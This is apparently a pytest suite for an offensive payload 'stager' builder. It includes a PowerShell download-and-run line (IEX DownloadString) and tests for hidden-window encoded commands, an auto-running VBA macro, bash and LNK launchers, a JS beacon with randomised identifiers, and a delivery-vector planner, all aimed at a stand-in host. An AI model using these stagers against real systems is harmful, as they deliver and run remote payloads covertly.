"""Stager builders: the text, the encoding, and the limits.

A stager's value is the string it produces, so these tests parse and execute the output rather
than trusting it: the -EncodedCommand blob is base64-decoded independently back to UTF-16LE,
the beacon body's cap is asserted, the JavaScript is both parsed by node (when present) and
checked for the rename, and the 'exec' mode is held to its own stated limit.

Run:  ./.venv/bin/python -m pytest tests/test_stager.py -q
"""
import base64
import codecs
import os
import re
import shutil
import subprocess
import sys

import pytest

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, HERE)

from core import stager as S  # noqa: E402
from core.symbols import Symbols  # noqa: E402

# unit tier: no network, no servers. The node half is a subprocess and skips cleanly without it.
pytestmark = pytest.mark.unit

URL = "https://stager.test/payload.bin"
NODE = shutil.which("node")


def _idents(text):
    """Every `__...` identifier the generated JavaScript declares."""
    return set(re.findall(r"__[A-Za-z0-9_]+", text))


# ============================================================== encode_command =====
def test_encode_command_is_utf16le_then_base64():
    cmd = "IEX (New-Object Net.WebClient).DownloadString('x') - join 'a b'"
    blob = S.encode_command(cmd)
    raw = base64.b64decode(blob)                       # decoded without the module's help
    assert raw == cmd.encode("utf-16le")
    assert codecs.decode(raw, "utf-16le") == cmd
    # -EncodedCommand wants UTF-16LE, not UTF-8: the two byte strings differ
    assert base64.b64decode(blob) != cmd.encode("utf-8")


def test_encode_command_round_trips_non_ascii():
    cmd = "echo caf\u00e9 \u65e5\u672c"                  # escaped: the source stays pure ASCII
    assert base64.b64decode(S.encode_command(cmd)).decode("utf-16le") == cmd


# ================================================================== powershell =====
def test_powershell_iex_is_the_downloadstring_oneliner():
    out = S.powershell(URL)
    assert "DownloadString" in out and "IEX" in out
    assert URL in out
    assert "hidden" in out


def test_powershell_enc_embeds_the_encoded_command_and_hides_the_window():
    out = S.powershell(URL, style="enc")
    inner = f"IEX (New-Object Net.WebClient).DownloadString('{URL}')"
    assert S.encode_command(inner) in out
    assert "hidden" in out
    assert URL not in out, "the cleartext url leaked into the encoded form"


def test_powershell_refuses_an_unknown_style():
    with pytest.raises(ValueError):
        S.powershell(URL, style="whatever")


# ========================================================================== VBA =====
def test_vba_runs_the_oneliner_on_document_open():
    out = S.vba(URL)
    assert "Sub AutoOpen()" in out and out.rstrip().endswith("End Sub")
    assert "WScript.Shell" in out
    assert "powershell" in out and URL in out
    assert "\r\n" in out, "a Word/Excel macro import wants CRLF"


def test_vba_accepts_a_custom_auto_run_module():
    assert "Sub Document_Open()" in S.vba(URL, module="Document_Open")


def test_vba_refuses_an_unsafe_sub_name():
    for bad in ("bad name", "Sub)", "1st", ""):
        with pytest.raises(ValueError):
            S.vba(URL, module=bad)


# ============================================================== command-line forms ==
def test_bash_is_the_posix_pipe():
    out = S.bash(URL)
    assert URL in out and "bash" in out


def test_lnk_command_is_the_windows_form():
    out = S.lnk_command(URL)
    assert URL in out and "powershell" in out


# ========================================================================== JS =====
def test_js_beacon_is_bounded_and_has_no_eval():
    out = S.js({"url": URL, "mode": "beacon"})
    assert URL in out
    assert "eval(" not in out
    assert "2048" in out, "the beacon body cap must be present in the output"
    assert "sendBeacon" in out and "XMLHttpRequest" in out


def test_js_random_symbols_rename_the_identifiers():
    a = S.js({"url": URL, "symbols": Symbols.random_()})
    b = S.js({"url": URL, "symbols": Symbols.random_()})
    na, nb = _idents(a), _idents(b)
    assert na and nb
    assert na != nb, "two random campaigns produced the same identifier names"
    assert "__bh_url" not in na
    assert URL in a and URL in b


def test_js_fixed_symbols_keep_the_historical_names():
    assert "__bh_url" in _idents(S.js({"url": URL, "symbols": Symbols.fixed()}))
    assert "__bh_url" in _idents(S.js({"url": URL}))    # the default is the fixed set too


def test_js_exec_states_its_limit_and_never_claims_execution():
    out = S.js({"url": URL, "mode": "exec"})
    assert S.EXEC_LIMIT in out, "the returned 'limit' value is not carried in the output"
    assert "does NOT run" in out
    assert "eval(" not in out
    # no execution primitive may survive in exec mode: strip the disclaimer first, so a
    # 'run(' hidden inside the limit text cannot be mistaken for one
    assert "run(" not in out.replace("does NOT run", ""), "exec mode carries a run primitive"


def test_js_requires_a_url():
    for bad in (None, "", "   "):
        with pytest.raises(ValueError):
            S.js({"url": bad})
    with pytest.raises(ValueError):
        S.js("not-a-dict")


def test_js_refuses_an_unknown_mode():
    with pytest.raises(ValueError):
        S.js({"url": URL, "mode": "rm-rf"})


def test_js_refuses_a_retry_count_outside_the_bound():
    with pytest.raises(ValueError):
        S.js({"url": URL, "retries": 9999})


def test_js_url_with_a_quote_is_refused_rather_than_broken():
    with pytest.raises(ValueError):
        S.js({"url": "https://x.test/a'b"})


@pytest.mark.integration  # node --check runs in a subprocess
def test_every_mode_is_valid_javascript(tmp_path):
    if NODE is None:
        pytest.skip("node not installed")
    for mode in ("beacon", "download", "redirect", "exec"):
        out = S.js({"url": URL, "mode": mode})
        path = tmp_path / f"{mode}.js"
        path.write_text(out, encoding="utf-8")
        proc = subprocess.run([NODE, "--check", str(path)], capture_output=True, text=True,
                              timeout=60)
        assert proc.returncode == 0, f"{mode}: {proc.stderr[:300]}"


# ================================================================ deliver_plan =====
def test_deliver_plan_is_ranked_and_labelled():
    plan = S.deliver_plan({"os": "windows", "browser": "chrome",
                           "macro_policy": "enabled", "hta_policy": "allowed"})
    assert plan
    assert all({"kind", "why", "confidence"} <= set(entry) for entry in plan)
    labels = [entry["confidence"] for entry in plan]
    assert all(label in ("CONFIRMED", "SUSPECTED", "FAILED") for label in labels)
    assert labels[0] == "CONFIRMED", "CONFIRMED must sort first"
    assert "vba" in [entry["kind"] for entry in plan]


def test_deliver_plan_marks_a_disabled_macro_policy_as_failed():
    plan = S.deliver_plan({"os": "windows", "macro_policy": "disabled"})
    vba = [entry for entry in plan if entry["kind"] == "vba"]
    assert vba and vba[0]["confidence"] == "FAILED"


def test_deliver_plan_with_nothing_known_returns_the_empty_answer():
    plan = S.deliver_plan({})
    assert plan
    assert all(entry["confidence"] != "CONFIRMED" for entry in plan)


def test_deliver_plan_offers_bash_on_unix():
    plan = S.deliver_plan({"os": "linux", "browser": "firefox"})
    assert "bash" in [entry["kind"] for entry in plan]
